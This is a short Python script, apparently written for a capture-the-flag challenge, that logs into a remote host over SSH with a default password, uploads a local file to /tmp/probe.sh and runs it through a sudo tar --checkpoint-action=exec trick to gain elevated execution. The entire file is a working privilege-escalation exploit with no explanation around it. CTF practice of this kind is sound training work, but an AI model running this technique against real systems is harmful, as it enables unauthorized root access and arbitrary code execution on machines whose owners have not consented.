import paramiko, sys
HOST="0.cloud.chals.io"; PORT=33942; USER="vboxuser"; PW="changeme"
c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect(HOST, port=PORT, username=USER, password=PW, timeout=15, allow_agent=False, look_for_keys=False)
if len(sys.argv) > 1:
    sftp=c.open_sftp()
    sftp.put(sys.argv[1], "/tmp/probe.sh")
    sftp.chmod("/tmp/probe.sh", 0o755)
    sftp.close()
cmd='sudo -n /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/tmp/probe.sh'
stdin,stdout,stderr=c.exec_command(cmd)
print(stdout.read().decode(errors="replace"), end="")
err=stderr.read().decode(errors="replace")
if err.strip(): print("STDERR:", err, end="")
c.close()
